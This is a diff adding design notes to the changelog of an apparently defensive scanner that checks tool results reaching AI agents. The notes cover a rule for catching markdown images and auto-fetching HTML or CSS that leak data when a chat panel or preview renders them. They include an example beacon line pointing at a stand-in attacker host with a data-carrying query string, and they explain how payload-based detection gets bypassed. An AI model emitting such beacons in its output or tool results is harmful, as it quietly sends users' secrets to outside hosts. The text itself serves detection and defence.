@@ -530,6 +530,68 @@ client kits and a dashboard.
   invisible characters is one nobody can review.
 - 17 rules now, down from 19, with 111 assertions.
 
+### The output that fetches itself
+
+- **`render.beacon`** (`ai_bunker/beacon.py`): a tool result carrying
+  `![](https://evil.example/p.gif?d=…)` exfiltrates on **render**. No
+  instruction, no cooperation from the model — a chat panel, an editor preview
+  or a dashboard fetches that uniform resource locator (URL) and its query
+  string lands in somebody else's access log. `injection.exfiltration` looks for a *request* to send data and
+  there is none, so nothing fired.
+- **The payload cannot be the signal, and that is the finding.** A beacon
+  carrying `?s=AKIA…` was already caught — by `global.aws_access_key`, because
+  the stolen value happened to look like a key. That is luck. The same beacon
+  carrying base64, or a summary of the repository, matched nothing at all.
+- Three ways of making the payload the signal were tried and dropped, each for
+  a reason this repository had already paid for: **a length threshold** on the
+  query string (removing `injection.hidden_text` taught exactly this — *their
+  threshold was the bypass*); **enumerating parameter names** (`d`, `s`,
+  `data`, `log` — the attacker picks the name, so the space is infinite, which
+  is the mistake the dependency rules stopped making); **neutralising by
+  default** (it edits text a person will read, and the settled rule is that
+  glyphless characters may be stripped and meaning-bearing content may not).
+- What is left has nothing to bypass: **an allowlist of hosts whose untrusted
+  content may fetch itself.** The Content Security Policy model, and it holds
+  because it never reasons about the payload. `render.allow_hosts` ships
+  **empty** rather than carrying an opinion — allowing a host means trusting it
+  not to forward, and a badge service with a `?url=` endpoint would launder
+  exactly what this catches.
+- Enumerating the *forms* is not the rejected mistake, and the difference is
+  worth stating because it looks identical: a parameter name is the attacker's
+  to choose, while the set of constructs a renderer fetches unasked belongs to
+  HyperText Markup Language (HTML). It is finite and published. Covered:
+  markdown images inline **and** reference-style,
+  `src`/`srcset`/`poster`/`data` on the eleven auto-fetching elements, `href`
+  on `link` only, and `url()` in Cascading Style Sheets (CSS).
+- **Two tiers, the shape the rug pull already uses.** *Noted* by default: the
+  hosts are named and not one byte is touched. *Neutralised* on
+  `render.neutralise: true`: an image becomes a link, an auto-fetching
+  attribute keeps its URL under a name no renderer fetches, `url(` becomes
+  `blocked-url(`. **Nothing is deleted** and every URL stays readable, which is
+  what makes it defensible — and it is still an edit, so the operator asks.
+- The note names the **host** and never the URL, in either language. A
+  beacon's query string *is* the stolen data; quoting it back would put the
+  exfiltrated bytes into the context window a second time while explaining
+  that they were being stolen. The decision record follows the same rule, and
+  carries the destination — the one fact an incident needs — unioned across
+  every tool result in the turn.
+- `/health` publishes `render.beacons` as `noted` or `neutralised`, because the
+  difference is what this deployment actually does, not a preference.
+- **Three bugs found by probing the implementation rather than reading it**, two
+  of them in the first version: a single pattern matched once per tag, so
+  `<video poster=… src=…>` was neutralised once and the second URL stayed live
+  — a control that looks like it worked; `srcset` carries a comma-separated
+  list, so reading only the first URL left the rest fetching; and `\b` matches
+  between the hyphen and the `s` of `data-ai-bunker-blocked-src`, so a
+  neutralised tag was detected again as a live beacon. Neutralising has to be
+  idempotent or the note it produces describes the fix instead of the attack.
+- Code spans and fences are excluded, in both directions: a README that
+  *documents* `![](https://host/x.png)` does not fetch it, and the files an
+  agent reads most are exactly the ones that show markup as an example.
+  Neutralising copies code through untouched rather than masking it — rewriting
+  the example inside a fence would edit documentation to stop a fetch that was
+  never going to happen.
+
 ### Rules
 
 - One format, two scopes (`output`, `command`), three severities, with the
